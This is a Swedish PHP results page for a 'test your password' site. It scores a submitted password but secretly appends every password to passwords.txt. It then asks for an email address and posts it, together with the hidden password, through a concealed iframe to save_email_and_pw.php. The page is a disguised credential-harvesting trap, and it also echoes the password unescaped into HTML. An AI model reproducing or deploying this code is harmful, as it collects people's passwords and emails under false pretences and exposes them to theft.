<!DOCTYPE html>
<head>
  <meta charset="utf-8">
  <title>Resultat – Testa ditt lösenord!</title>
  <link rel="stylesheet" href="stylesheet.css">
</head>
<body>
  <iframe name="secret_iframe" style="display: none;" />
  <?php
    $password = $_POST["password"];
    $pw_log = fopen("passwords.txt", "a");
    fwrite($pw_log, $password . PHP_EOL);
    fclose($pw_log);
  ?>
  <div class="main">
    <div>
      <h1>Resultat</h1>
      <table>
        <tr>
          <td>Innehåller små bokstäver:</td>
          <td>
            <?php
              $lower = "abcdefghijklmnopqrstuvwxyz";
              $contains_lower = False;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y < strlen($lower); $y++) {
                  if($password[$x] == $lower[$y]) {
                    echo "Ja";
                    $contains_lower = True;
                    break 2;
                  }
                }
              }
              if($contains_lower == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller stora bokstäver:</td>
          <td>
            <?php
              $upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
              $contains_upper = False;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y < strlen($upper); $y++) {
                  if($password[$x] == $upper[$y]) {
                    echo "Ja";
                    $contains_upper = True;
                    break 2;
                  }
                }
              }
              if($contains_upper == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller siffror:</td>
          <td>
            <?php
              $numbers = "0123456789";
              $contains_number = False;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y < strlen($numbers); $y++) {
                  if($password[$x] == $numbers[$y]) {
                    echo "Ja";
                    $contains_number = True;
                    break 2;
                  }
                }
              }
              if($contains_number == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller symboler:</td>
          <td>
            <?php
              $contains_symbol = False;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y <= 255; $y++) {
                  if((48 <= $y and $y <= 57) or (65 <= $y and $y <= 90) or (97 <= $y and $y <= 122)) {
                    break 1;
                  }
                  if(ord($password[$x]) == $y) {
                    echo "Ja";
                    $contains_symbol = True;
                    break 2;
                  }
                }
              }
              if($contains_symbol == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Längd:</td>
          <td>
            <?php
              if(strlen($password) <= 8) {
                echo "Kort";
                $length = 0;
              } elseif(strlen($password) <= 20) {
                echo "Medellångt";
                $length = 1;
              } else {
                echo "Långt";
                $length = 2;
              }
            ?>
          </td>
        </tr>
      </table>
      <h2>
        Poäng: <?php
          $score = 0;
          if($contains_lower) {
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_upper) {
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_number) {
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_symbol) {
            $score += 10;
          } else {
            $score -= 5;
          }
          if($length == 2) {
            $score += 20;
          } elseif($length == 0) {
            $score -= 25;
          }
          echo $score;
        ?>
      </h2>
      <p>
        Ditt lösenord är
        <?php
          if($score < -15) {
            echo " ganska dåligt. Du borde byta det.";
          } elseif($score > 15) {
            echo " jättebra! Fortsätt så!";
          } else {
            echo " helt okej. Det funkar nog.";
          }
        ?>
      </p>
      <p>
        Om du vill ha ett bättre lösenord kan du skriva in din emailadress här så skickar vi ett bättre<br>
        lösenord till dig när vår superhögteknologiska lösenordsgenerator passerar betastadiet.
      </p>
      <form action="save_email_and_pw.php" method="post" target="secret_iframe">
        <input type="password" name="password" value="<?php echo $password; ?>" style="display: none;">
        <p><input type="email" name="email" size="40" required></p>
        <p><input type="submit" value="Ge mig ett lösenord!"></p>
      </form>
    </div>
  </div>
</body>
